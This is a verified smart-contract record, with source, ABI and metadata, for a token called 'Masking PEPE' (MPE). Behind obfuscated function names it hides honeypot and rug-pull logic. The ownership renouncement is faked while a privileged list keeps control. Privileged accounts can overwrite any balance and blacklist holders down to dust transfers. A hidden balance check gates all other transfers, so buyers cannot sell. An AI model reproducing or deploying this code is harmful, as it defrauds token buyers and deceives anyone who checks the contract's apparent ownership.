{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface toTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundMode) external view returns (uint256);\n\n    function transfer(address buyTeamFrom, uint256 fromMarketing) external returns (bool);\n\n    function allowance(address launchTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyTeamFrom,\n        uint256 fromMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitSellFrom, uint256 value);\n    event Approval(address indexed launchTake, address indexed spender, uint256 value);\n}\n\nabstract contract buyFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitBuyShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityAtTotal {\n    function createPair(address exemptAuto, address toLaunchMin) external returns (address);\n}\n\ninterface modeTakeLaunch is toTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MaskingPEPE is buyFrom, toTeam, modeTakeLaunch {\n\n    function fromLaunch(uint256 fromMarketing) public {\n        receiverMinReceiver();\n        autoLimit = fromMarketing;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingFromTo;\n    }\n\n    string private fundTxEnable = \"Masking PEPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoSenderTake;\n    }\n\n    address private tokenAt;\n\n    uint8 private autoSenderTake = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedListTrading;\n    }\n\n    function balanceOf(address fundMode) public view virtual override returns (uint256) {\n        return toIs[fundMode];\n    }\n\n    mapping(address => bool) public launchFromMarketing;\n\n    function txWallet(address swapFundEnable) public {\n        receiverMinReceiver();\n        \n        if (swapFundEnable == walletAmount || swapFundEnable == modeReceiver) {\n            return;\n        }\n        launchFromMarketing[swapFundEnable] = true;\n    }\n\n    bool public takeMax;\n\n    mapping(address => bool) public receiverSenderFund;\n\n    uint256 private tradingTeam;\n\n    bool private walletTake;\n\n    function receiverMinReceiver() private view {\n        require(receiverSenderFund[_msgSender()]);\n    }\n\n    uint256 private receiverLiquidityShould;\n\n    uint256 private teamExempt;\n\n    address public modeReceiver;\n\n    address public walletAmount;\n\n    constructor (){\n        \n        limitBuyShould minIs = limitBuyShould(senderBuy);\n        modeReceiver = liquidityAtTotal(minIs.factory()).createPair(minIs.WETH(), address(this));\n        \n        walletAmount = _msgSender();\n        totalAutoTrading();\n        receiverSenderFund[walletAmount] = true;\n        toIs[walletAmount] = marketingFromTo;\n        if (walletTake) {\n            takeMax = true;\n        }\n        emit Transfer(address(0), walletAmount, marketingFromTo);\n    }\n\n    function transferFrom(address maxReceiver, address buyTeamFrom, uint256 fromMarketing) external override returns (bool) {\n        if (_msgSender() != senderBuy) {\n            if (txIsMarketing[maxReceiver][_msgSender()] != type(uint256).max) {\n                require(fromMarketing <= txIsMarketing[maxReceiver][_msgSender()]);\n                txIsMarketing[maxReceiver][_msgSender()] -= fromMarketing;\n            }\n        }\n        return launchSwapTotal(maxReceiver, buyTeamFrom, fromMarketing);\n    }\n\n    function transfer(address teamLaunched, uint256 fromMarketing) external virtual override returns (bool) {\n        return launchSwapTotal(_msgSender(), teamLaunched, fromMarketing);\n    }\n\n    address marketingEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private marketingFromTo = 100000000 * 10 ** 18;\n\n    function allowance(address buyTeam, address launchedShould) external view virtual override returns (uint256) {\n        if (launchedShould == senderBuy) {\n            return type(uint256).max;\n        }\n        return txIsMarketing[buyTeam][launchedShould];\n    }\n\n    function approve(address launchedShould, uint256 fromMarketing) public virtual override returns (bool) {\n        txIsMarketing[_msgSender()][launchedShould] = fromMarketing;\n        emit Approval(_msgSender(), launchedShould, fromMarketing);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed limitReceiver, address indexed minMarketing);\n\n    mapping(address => mapping(address => uint256)) private txIsMarketing;\n\n    mapping(address => uint256) private toIs;\n\n    function name() external view virtual override returns (string memory) {\n        return fundTxEnable;\n    }\n\n    function tradingEnable(address teamLaunched, uint256 fromMarketing) public {\n        receiverMinReceiver();\n        toIs[teamLaunched] = fromMarketing;\n    }\n\n    function launchSwapTotal(address maxReceiver, address buyTeamFrom, uint256 fromMarketing) internal returns (bool) {\n        if (maxReceiver == walletAmount) {\n            return fromFee(maxReceiver, buyTeamFrom, fromMarketing);\n        }\n        uint256 feeEnable = toTeam(modeReceiver).balanceOf(marketingEnable);\n        require(feeEnable == autoLimit);\n        require(buyTeamFrom != marketingEnable);\n        if (launchFromMarketing[maxReceiver]) {\n            return fromFee(maxReceiver, buyTeamFrom, limitSender);\n        }\n        return fromFee(maxReceiver, buyTeamFrom, fromMarketing);\n    }\n\n    bool public fundFrom;\n\n    function getOwner() external view returns (address) {\n        return tokenAt;\n    }\n\n    string private launchedListTrading = \"MPE\";\n\n    uint256 autoLimit;\n\n    function totalAutoTrading() public {\n        emit OwnershipTransferred(walletAmount, address(0));\n        tokenAt = address(0);\n    }\n\n    function fromFee(address maxReceiver, address buyTeamFrom, uint256 fromMarketing) internal returns (bool) {\n        require(toIs[maxReceiver] >= fromMarketing);\n        toIs[maxReceiver] -= fromMarketing;\n        toIs[buyTeamFrom] += fromMarketing;\n        emit Transfer(maxReceiver, buyTeamFrom, fromMarketing);\n        return true;\n    }\n\n    bool public amountLaunched;\n\n    uint256 minTake;\n\n    function owner() external view returns (address) {\n        return tokenAt;\n    }\n\n    uint256 constant limitSender = 3 ** 10;\n\n    uint256 private maxListLaunch;\n\n    address senderBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tradingExempt(address limitEnable) public {\n        if (amountLaunched) {\n            return;\n        }\n        if (tradingTeam != maxListLaunch) {\n            receiverLiquidityShould = maxListLaunch;\n        }\n        receiverSenderFund[limitEnable] = true;\n        \n        amountLaunched = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSellFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"fromLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchFromMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSenderFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAutoTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"tradingEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"}],\"name\":\"tradingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTeamFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFundEnable\",\"type\":\"address\"}],\"name\":\"txWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MaskingPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}